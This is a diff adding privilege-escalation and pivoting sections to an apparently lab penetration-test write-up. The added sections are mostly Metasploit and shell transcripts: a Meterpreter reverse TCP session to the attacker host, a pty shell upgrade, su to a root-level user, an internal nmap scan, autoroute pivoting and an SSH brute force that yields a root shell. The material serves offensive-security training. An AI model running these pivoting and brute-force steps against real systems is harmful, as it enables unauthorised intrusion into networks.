@@ -471,6 +471,8 @@ meterpreter >
 
 ```
 
+##### Basic privilege escalation
+
 <br/>
 By viewing /etc/passwd we can see that our ftpuser is already a priviliged (uid: 0, which is effectively root):
 
@@ -558,4 +560,178 @@ cat .flag.txt
 You got the first machine!
 root@xubuntu:/var/www# 
 ```
+<br/>
+##### Pivoting to other networks
 
+Alright. Let's leverage the compromised 172.16.37.234 machine to create a route to the second network and compromise the remaining 172.16.37.220 machine.
+
+First we want to run an nmap inside 172.16.37.234. I got logged out,so to do it we need to run the following.
+
+
+<details> 
+  <summary> <b>Initial Nmap scan from our compromise machine.</b> </summary>
+
+```bash
+
+meterpreter > shell
+Process 3048 created.
+Channel 1 created.
+bash -i
+bash: cannot set terminal process group (1105): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@xubuntu:/var/www/html$ su ftpuser
+su ftpuser
+su: must be run from a terminal
+www-data@xubuntu:/var/www/html$ python -c 'import pty;pty.spawn("/bin/bash")';
+<tml$ python -c 'import pty;pty.spawn("/bin/bash")';                         
+www-data@xubuntu:/var/www/html$ su ftpuser
+su ftpuser
+Password: ftpuser
+
+root@xubuntu:/var/www/html# nmap 172.16.50.222
+nmap 172.16.50.222
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2021-02-16 17:09 UTC
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 172.16.50.222
+Host is up (0.000025s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 00:50:56:BA:91:50 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 1.50 seconds
+root@xubuntu:/var/www/html# 
+
+
+```
+</details>
+<br/>
+
+As we can see an SSH service is running on 172.16.50.222. Let's background our current Meterpreter shell by pressing ctrl + z and then run the autoroute functionality once the meterpreter> prompt appears.
+[Autoroute routes  our  exploitation  attempts  through  the  first  compromised  machine  andenables us to access the remaining machine,through the second network (172.16.50.0/24)]
+So, let's pivot from here focussing on the SSH service.
+<br/>
+<details> 
+  <summary> <b>Autoroute and final exploit.</b> </summary>
+
+```bash
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.13.37.10:53 
+[*] Meterpreter session 3 opened (10.13.37.10:53 -> 172.16.37.234:47468) at 2021-02-16 12:19:38 -0500
+
+meterpreter > run autoroute -s 172.16.50.0/24
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+[*] Adding a route to 172.16.50.0/255.255.255.0...
+[+] Added route to 172.16.50.0/255.255.255.0 via 172.16.37.234
+[*] Use the -p option to list all active routes
+meterpreter > use auxiliary/scanner/ssh/ssh_login
+Loading extension auxiliary/scanner/ssh/ssh_login...
+[-] Failed to load extension: Unable to load extension 'auxiliary/scanner/ssh/ssh_login' - module does not exist.
+meterpreter > 
+Background session 3? [y/N]  y
+[-] Unknown command: y.
+msf6 exploit(multi/handler) > use auxiliary/scanner/ssh/ssh_login
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting                Required  Description
+   ----              ---------------                --------  -----------
+   BLANK_PASSWORDS   false                          no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                          no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                          no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                          no        Add all users in the current database to the list
+   PASSWORD                                         no        A specific password to authenticate with
+   PASS_FILE         /usr/share/ncrack/minimal.usr  no        File containing passwords, one per line
+   RHOSTS            172.16.50.222                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT             22                             yes       The target port
+   STOP_ON_SUCCESS   false                          yes       Stop guessing when a credential works for a host
+   THREADS           1                              yes       The number of concurrent threads (max one per host)
+   USERNAME                                         no        A specific username to authenticate as
+   USERPASS_FILE                                    no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                          no        Try the username as the password for all users
+   USER_FILE         /usr/share/ncrack/minimal.usr  no        File containing usernames, one per line
+   VERBOSE           true                           yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.50.222
+rhosts => 172.16.50.222
+msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /usr/share/ncrack/minimal.usr
+user_file => /usr/share/ncrack/minimal.usr
+msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /usr/share/ncrack/minimal.usr
+pass_file => /usr/share/ncrack/minimal.usr
+msf6 auxiliary(scanner/ssh/ssh_login) > set verbose true
+verbose => true
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[+] 172.16.50.222:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xubuntu 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux '
+[*] Command shell session 4 opened (10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22) at 2021-02-16 12:21:30 -0500
+[-] 172.16.50.222:22 - Failed: 'admin:root'
+[-] 172.16.50.222:22 - Failed: 'admin:admin'
+[-] 172.16.50.222:22 - Failed: 'admin:administrator'
+[-] 172.16.50.222:22 - Failed: 'admin:webadmin'
+[-] 172.16.50.222:22 - Failed: 'admin:sysadmin'
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[+] 172.16.50.222:22 - Success: 'root:root' 'uid=0(root) gid=0(root) groups=0(root) Linux xubuntu 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux '
+bash [*] Command shell session 5 opened (10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22) at 2021-02-16 12:22:33 -0500
+bash -i
+shell
+[-] 172.16.50.222:22 - Failed: 'admin:root'
+[-] 172.16.50.222:22 - Failed: 'admin:admin'
+^C[*] Caught interrupt from the console...
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information                       Connection
+  --  ----  ----                   -----------                       ----------
+  2         meterpreter php/linux  www-data (33) @ xubuntu           10.13.37.10:53 -> 172.16.37.234:47466 (172.16.37.234)
+  3         meterpreter php/linux  www-data (33) @ xubuntu           10.13.37.10:53 -> 172.16.37.234:47468 (172.16.37.234)
+  4         shell linux            SSH root:root (172.16.50.222:22)  10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22 (172.16.50.222)
+  5         shell linux            SSH root:root (172.16.50.222:22)  10.13.37.10-172.16.37.234:0 -> 172.16.50.222:22 (172.16.50.222)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 4
+[*] Starting interaction with 4...
+
+mesg: ttyname failed: Inappropriate ioctl for device
+bash -i
+bash: cannot set terminal process group (3291): Inappropriate ioctl for device
+bash: no job control in this shell
+root@xubuntu:~# ls
+ls
+root@xubuntu:~# pwd
+/root
+pwd
+root@xubuntu:~# ls -la
+ls -la
+total 48
+drwx------  6 root root 4096 Apr  1  2019 .
+drwxr-xr-x 24 root root 4096 Dec 15  2017 ..
+-rw-------  1 root root 4914 May 17  2019 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwx------  2 root root 4096 Mar 29  2019 .cache
+drwxr-xr-x  3 root root 4096 Mar 27  2019 .composer
+-rw-r--r--  1 root root   22 Apr  1  2019 .flag.txt
+-rw-------  1 root root   53 Mar 27  2019 .mysql_history
+drwxr-xr-x  2 root root 4096 Mar 27  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4096 Mar 27  2019 .ssh
+root@xubuntu:~# cat .flag.txt
+cat .flag.txt
+Congratz! You got it.
+root@xubuntu:~# 
+
+```
+</details>
+<br/>
